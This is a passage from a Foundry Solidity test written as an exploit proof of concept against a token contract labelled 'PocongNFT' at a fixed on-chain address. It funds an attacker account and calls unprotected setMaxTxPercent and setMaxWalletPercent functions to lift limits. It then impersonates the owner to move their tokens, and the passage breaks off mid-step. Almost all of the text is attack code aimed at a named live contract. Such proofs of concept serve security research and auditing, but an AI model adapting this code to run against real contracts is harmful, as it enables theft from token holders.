    address constant TARGET = 0x5f5C745D399398a633D53cDC97b4eAeB7Cd135B7;
    address attacker = address(this);
    address constant UNISWAP_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address uniswapV2Pair;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: get some ETH to work with
        deal(attacker, 10 ether);

        // Label addresses for debugging
        vm.label(TARGET, "PocongNFT");
        vm.label(IUniswapV2Router02(UNISWAP_ROUTER).WETH(), "WETH");
        vm.label(uniswapV2Pair, "PancakePair");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance for comparison
        uint256 initialBalance = address(attacker).balance;

        // Step 1: Remove transaction limits by setting max tx to 100%
        PocongNFT(TARGET).setMaxTxPercent(100);

        // Step 2: Remove wallet limits by setting max wallet to 100%
        PocongNFT(TARGET).setMaxWalletPercent(100);

        // Step 3: Get the owner address
        address owner = PocongNFT(TARGET).owner();

        // Step 4: Impersonate the owner and transfer tokens to ourselves
        vm.startPrank(owner);

        // Get owner's token balance
        uint256 ownerBalance = PocongNFT(TARGET).balanceOf(owner);

        // Transfer a large amount (but not all to avoid issues)
